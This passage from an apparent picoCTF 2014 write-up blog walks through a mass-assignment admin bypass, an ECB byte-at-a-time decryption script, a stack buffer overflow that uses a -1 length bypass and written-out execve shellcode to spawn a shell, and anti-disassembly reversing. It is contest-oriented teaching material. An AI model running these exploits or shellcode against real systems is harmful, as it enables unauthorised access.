</span><span class='line'>  <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;control-group&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;label</span> <span class="na">class=</span><span class="s">&quot;control-label&quot;</span> <span class="na">for=</span><span class="s">&quot;user_username&quot;</span><span class="nt">&gt;</span>Username<span class="nt">&lt;/label&gt;</span>:
</span><span class='line'>    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;controls&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">&quot;user_username&quot;</span> <span class="na">name=</span><span class="s">&quot;user[username]&quot;</span> <span class="na">size=</span><span class="s">&quot;30&quot;</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;control-group&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;label</span> <span class="na">class=</span><span class="s">&quot;control-label&quot;</span> <span class="na">for=</span><span class="s">&quot;user_password&quot;</span><span class="nt">&gt;</span>Password<span class="nt">&lt;/label&gt;</span>:
</span><span class='line'>    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;controls&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">&quot;user_password&quot;</span> <span class="na">name=</span><span class="s">&quot;user[password]&quot;</span> <span class="na">size=</span><span class="s">&quot;30&quot;</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;control-group&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;label</span> <span class="na">class=</span><span class="s">&quot;control-label&quot;</span> <span class="na">for=</span><span class="s">&quot;user_is_admin&quot;</span><span class="nt">&gt;</span>is_admin<span class="nt">&lt;/label&gt;</span>:
</span><span class='line'>    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;controls&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">&quot;user_password&quot;</span> <span class="na">name=</span><span class="s">&quot;user[is_admin]&quot;</span> <span class="na">size=</span><span class="s">&quot;30&quot;</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">value=</span><span class="s">&quot;1&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/div&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>By adding the <code>user[is_admin]</code> parameter, the register page thinks we are admin and gives us the flag:</p>

<p><img src="/assets/picoctf/daedelus.png" alt="" /></p>

<h1>Web Interception (140 points)</h1>

<p><code>We were able to get some code running in a Daedalus browser.
Unfortunately we can't quite get it to send us a cookie for its internal
login page ourselves... But we can make it make requests that we can see,
and it seems to be encrypting using ECB mode. See here for more details
about what we can get. It's running at vuln2014.picoctf.com:65414.
Can you get us the cookie?</code></p>

<p>Swappage and me solved this one. The program does the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">oracle</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>  <span class="c"># so, this is simulated. In reality we&#39;d have to run javascript on a target web browser</span>
</span><span class='line'>  <span class="c"># and capture the traffic. That&#39;s pretty hard to do in a way that scales, though, so we</span>
</span><span class='line'>  <span class="c"># simulate it instead.</span>
</span><span class='line'>  <span class="c"># This uses ECB mode.</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">AESCipher</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pkcs7_pad</span><span class="p">(</span><span class="s">&#39;GET /&#39;</span> <span class="o">+</span> <span class="n">s</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">secret_data</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>It takes user-supplied <em>hex-encoded</em> data and then returns an encrypted ciphertext in ECB mode. We need to find secret_data. The trick here is that ECB mode will return identical ciphertexts for identical plaintexts. Furthermore, it is a block-mode encryption. This means that we can create a block, have it encrypted, and check if it is present in the returned ciphertext. If so, our block must have matched part of the secret_data. In terms of blocks, we do the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">[</span> <span class="n">GET</span> <span class="o">/</span><span class="n">aaaaaaaaaaa</span>                  <span class="p">]</span> <span class="c"># block one, padded to 16 bytes</span>
</span><span class='line'><span class="p">[</span> <span class="n">guess_byte</span> <span class="o">+</span> <span class="n">pkcs7_padding</span>        <span class="p">]</span> <span class="c"># block two, our guess</span>
</span><span class='line'><span class="p">[</span> <span class="n">bogus</span> <span class="nb">bytes</span> <span class="o">+</span> <span class="n">part</span> <span class="n">of</span> <span class="n">secret_data</span> <span class="p">]</span> <span class="c"># block three, part of secret_data</span>
</span><span class='line'><span class="p">[</span> <span class="o">...</span><span class="n">secret_data</span><span class="o">...</span>                 <span class="p">]</span> <span class="c"># block four, more secret_data</span>
</span><span class='line'><span class="p">[</span> <span class="n">one</span> <span class="n">byte</span> <span class="n">of</span> <span class="n">secret_data</span> <span class="o">+</span> <span class="n">padding</span> <span class="p">]</span> <span class="c"># block five, we are interested in the ciphertext of this block!</span>
</span></code></pre></td></tr></table></div></figure>


<p>So if the ciphertext of our block two matches that of block five, we know that our guess was ok! We then prepend another byte to our guessed block. We add more padding to block three so that now, not one but <em>two</em> bytes of the secret_data are pushed onto block five. We repeat our guess for all possible characters and check the ciphertexts of block two and five. If they match, we have a bingo!</p>

<p>Long story short, here&rsquo;s the script to bruteforce secret_data:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">string</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pkcs7_pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span><span class='line'>  <span class="n">needed</span> <span class="o">=</span> <span class="mi">16</span> <span class="o">-</span> <span class="p">(</span><span class="n">l</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">s</span> <span class="o">+</span> <span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">needed</span><span class="p">)</span> <span class="o">*</span> <span class="n">needed</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">make_payload</span><span class="p">(</span><span class="n">guess</span><span class="p">):</span>  
</span><span class='line'>  <span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="c"># pad string to next block</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;a&quot;</span><span class="o">*</span><span class="mi">11</span> 
</span><span class='line'>  
</span><span class='line'>  <span class="c"># insert guessed bytes, but first pad them</span>
</span><span class='line'>  <span class="n">block</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="n">block</span> <span class="o">+=</span> <span class="n">guess</span>
</span><span class='line'>  <span class="n">block</span> <span class="o">=</span> <span class="n">pkcs7_pad</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># add guessed bytes + padding</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">block</span>               
</span><span class='line'>
</span><span class='line'>  <span class="c"># push last bytes into a new ciphertext block. The +1 was empirically determined!</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;a&quot;</span><span class="o">*</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">guess</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>   
</span><span class='line'>  
</span><span class='line'>  <span class="k">return</span> <span class="n">payload</span>
</span><span class='line'>  
</span><span class='line'><span class="n">bruteforce</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="c"># think the length of the plaintext is 48 bytes (3 16-byte blocks)</span>
</span><span class='line'><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">bruteforce</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">48</span><span class="p">:</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># we&#39;ll brute-force the entire ascii range</span>
</span><span class='line'>  <span class="k">for</span> <span class="ow">in</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">127</span><span class="p">)</span>
</span><span class='line'>      <span class="n">z</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'>      <span class="c"># display progress</span>
</span><span class='line'>      <span class="k">print</span> <span class="s">&quot;[+] trying {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'>      <span class="c"># connect to server</span>
</span><span class='line'>      <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;vuln2014.picoctf.com&#39;</span><span class="p">,</span> <span class="mi">65414</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>      <span class="c"># banner</span>
</span><span class='line'>      <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="c"># we bruteforce backwards, starting at the last byte</span>
</span><span class='line'>      <span class="n">payload</span> <span class="o">=</span> <span class="n">make_payload</span><span class="p">(</span><span class="n">z</span><span class="o">+</span><span class="n">bruteforce</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'>      <span class="c"># send payload</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span> <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>      <span class="c"># split ciphertext into 32 bytes (which are 16 bytes hex-encoded).</span>
</span><span class='line'>      <span class="c"># we need to look for a duplicate block. if we find a duplicate,</span>
</span><span class='line'>      <span class="c"># it means our guessed bytes match the end of the string.</span>
</span><span class='line'>      <span class="n">blocks</span> <span class="o">=</span> <span class="p">[</span><span class="n">ciphertext</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">32</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">),</span> <span class="mi">32</span><span class="p">)]</span>
</span><span class='line'>
</span><span class='line'>      <span class="c"># check if we have the same encoded block as the guess</span>
</span><span class='line'>      <span class="c"># the guessed block is the second returned block, due to the </span>
</span><span class='line'>      <span class="c"># way the payload is built up. </span>
</span><span class='line'>      <span class="k">if</span> <span class="n">blocks</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">in</span> <span class="n">blocks</span><span class="p">[</span><span class="mi">2</span><span class="p">:]:</span>
</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;match: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'>          <span class="n">bruteforce</span> <span class="o">=</span> <span class="n">z</span> <span class="o">+</span> <span class="n">bruteforce</span>
</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;[+] got {} so far&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">bruteforce</span><span class="p">)</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>congrats_on_your_first_ecb_ecryption\r\n</code>.</p>

<h1>No Overflow (140 points)</h1>

<p>This program tries to prevent buffer overflows by first asking for the input length.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf<span class="nv">$ </span>./no_overflow
</span><span class='line'>How long is your name?
</span><span class='line'>10
</span><span class='line'>What is your name?
</span><span class='line'>BBBBBBBBBBBBBBBBBBBBBBBBBB
</span><span class='line'>Hello, BBBBBBBBBBW
</span></code></pre></td></tr></table></div></figure>


<p>It disregards the rest of the ouput. However, the program uses <code>scanf</code>. If we supply <code>-1</code> as the length, we can bypass the overflow check:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf<span class="nv">$ </span><span class="o">(</span><span class="nb">echo</span> -1<span class="p">;</span> python -c <span class="s1">&#39;print &quot;A&quot;*300&#39;</span><span class="o">)</span> <span class="p">|</span> ./no_overflow
</span><span class='line'>How long is your name?
</span><span class='line'>What is your name?
</span><span class='line'>Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...snip...
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p>From here, it is easy to control EIP:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf<span class="nv">$ </span><span class="o">(</span><span class="nb">echo</span> -1<span class="p">;</span> python -c <span class="s1">&#39;print &quot;A&quot;*268+&quot;BBBB&quot;&#39;</span><span class="p">;</span> <span class="nb">echo</span><span class="o">)</span> <span class="p">|</span> ./no_overflow
</span><span class='line'>How long is your name?
</span><span class='line'>What is your name?
</span><span class='line'>Hello, AAAAAAAAAA...snip...
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>bas@tritonal:~/tmp/picoctf<span class="nv">$ </span>gdb no_overflow core
</span><span class='line'>...snip...
</span><span class='line'>Core was generated by <span class="sb">`</span>./no_overflow<span class="err">&#39;</span>.
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x42424242 in ?? ()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Quickly checking on the remote server if there is any protection on the binary:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>pico1139@shell:/home/no_overflow<span class="nv">$ </span>readelf -l no_overflow
</span><span class='line'>
</span><span class='line'>Elf file <span class="nb">type </span>is EXEC <span class="o">(</span>Executable file<span class="o">)</span>
</span><span class='line'>Entry point 0x8048430
</span><span class='line'>There are <span class="m">9</span> program headers, starting at offset 52
</span><span class='line'>
</span><span class='line'>Program Headers:
</span><span class='line'>  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
</span><span class='line'>  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
</span><span class='line'>  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
</span><span class='line'>      <span class="o">[</span>Requesting program interpreter: /lib/ld-linux.so.2<span class="o">]</span>
</span><span class='line'>  LOAD           0x000000 0x08048000 0x08048000 0x0080c 0x0080c R E 0x1000
</span><span class='line'>  LOAD           0x000f08 0x08049f08 0x08049f08 0x0012c 0x00130 RW  0x1000
</span><span class='line'>  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
</span><span class='line'>  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
</span><span class='line'>  GNU_EH_FRAME   0x0006e0 0x080486e0 0x080486e0 0x0003c 0x0003c R   0x4
</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
</span><span class='line'>  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1
</span></code></pre></td></tr></table></div></figure>


<p>The stack is executable! Furthermore, ASLR is not enabled. This makes it easy to stick in a <a href="http://shell-storm.org/shellcode/files/shellcode-827.php">shellcode</a> plus a NOP sled and return to an address on the stack:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>pico1139@shell:/home/no_overflow<span class="nv">$ </span><span class="o">(</span><span class="nb">echo</span> -1<span class="p">;</span> python -c <span class="s1">&#39;print &quot;A&quot;*268+&quot;\xd0\xd6\xff\xff&quot;+&quot;\x90&quot;*200+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;&#39;</span><span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> ./no_overflow
</span><span class='line'>How long is your name?
</span><span class='line'>What is your name?
</span><span class='line'>Hello, AAAAAAAAAAAAAAAAAAAAAA...snip...
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>11066<span class="o">(</span>pico1139<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1007<span class="o">(</span>no_overflow<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1017<span class="o">(</span>picogroup<span class="o">)</span>
</span><span class='line'>cat flag.txt
</span><span class='line'>what_is_your_sign
</span></code></pre></td></tr></table></div></figure>


<h1>Obfuscation (150 points)</h1>

<p>Tough one. There are some anti-disassembler tricks in here. Upon running the program, it asks for a password. Let&rsquo;s first try to get a breakpoint somewhere:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>b main
</span><span class='line'>Function <span class="s2">&quot;main&quot;</span> not defined.
</span><span class='line'>gdb-peda<span class="nv">$ </span>b __libc_start_main
</span><span class='line'>Breakpoint <span class="m">1</span> at 0x8048400
</span><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'>...
</span><span class='line'>Breakpoint 1, 0xf7e2c970 in __libc_start_main <span class="o">()</span>
</span><span class='line'>   from /lib/i386-linux-gnu/i686/cmov/libc.so.6
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/2x <span class="nv">$esp</span>
</span><span class='line'>0xffffd58c:   0x080484ed  0x08048420
</span></code></pre></td></tr></table></div></figure>


<p>Our entry-point is <code>0x08048420</code>. Set a breakpoint and continue tracing. We encounter an anti-disassembly trick:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">=</span>&gt; 0x804843a:  jmp    0x804843b
</span><span class='line'> <span class="p">|</span> 0x804843c:  ror    BYTE PTR <span class="o">[</span>eax-0x39<span class="o">]</span>,0x44
</span><span class='line'> <span class="p">|</span> 0x8048440:  and    al,0x4
</span><span class='line'> <span class="p">|</span> 0x8048442:  push   esp
</span><span class='line'> <span class="p">|</span> 0x8048443:  lea    eax,<span class="o">[</span>eax+ecx*1<span class="o">]</span>
</span><span class='line'> <span class="p">|</span>-&gt;   0x804843b:   inc    eax
</span><span class='line'>       0x804843d: dec    eax
</span><span class='line'>       0x804843e: mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x8048d54
</span><span class='line'>       0x8048446: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x1
</span></code></pre></td></tr></table></div></figure>


<p>It jumps one byte ahead, in the middle of the instruction, causing the disassembly of the next bytes to be incorrect. Luckily, this won&rsquo;t stop <code>gdb-peda</code>. Soon after, the program asks for a password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">=</span>&gt; 0x804846a:  call   0x80483c0 &lt;getline@plt&gt;
</span><span class='line'>   0x804846f: <span class="nb">test   </span>eax,eax
</span><span class='line'>
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>0x0804846a in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>b *0x804846f
</span><span class='line'>Breakpoint <span class="m">2</span> at 0x804846f
</span></code></pre></td></tr></table></div></figure>


<p>I entered <code>012345678</code> and pressed enter. The program transfers control to the function at <code>0x8048580</code> which supposedly checks our password. Set a breakpoint and continue. The programs then takes a single byte from the password and does some checks:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   0x80485b6:    movzx  ebp,BYTE PTR <span class="o">[</span>ebx+edx*1<span class="o">]</span> <span class="c"># grab char</span>
</span><span class='line'>   0x80485ba: mov    eax,ebp
</span><span class='line'>   0x80485bc: movsx  ecx,al
</span><span class='line'>   0x80485bf: add    ecx,0x40
</span><span class='line'>   0x80485c2: mov    edi,ecx
</span><span class='line'>   0x80485c4: sar    edi,0x1f                 <span class="c"># no idea what this </span>
</span><span class='line'>   0x80485c7: shr    edi,0x19                 <span class="c"># is supposed to do.</span>
</span><span class='line'>   0x80485ca: add    ecx,edi
</span><span class='line'>   0x80485cc: and    ecx,0x7f                 <span class="c"># check for ASCII?</span>
</span><span class='line'>   0x80485cf: sub    ecx,edi
</span><span class='line'>   0x80485d1: mov    BYTE PTR <span class="o">[</span>esp+ecx*1+0xc<span class="o">]</span>,0x1
</span><span class='line'>   0x80485d6: lea    ecx,<span class="o">[</span>ebp-0xa<span class="o">]</span>            <span class="c"># subtract 0xa from char</span>
</span><span class='line'>   0x80485d9: cmp    cl,0x70                  <span class="c"># check for below &#39;z&#39;</span>
</span><span class='line'>   0x80485dc: jbe    0x8048600
</span></code></pre></td></tr></table></div></figure>


<p>And then jumps to <code>0x8048600</code>. This piece is interesting, because it uses a jump-table (like in a switch statement). Depending on the value of (char - 0xa), it jumps to a code region:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
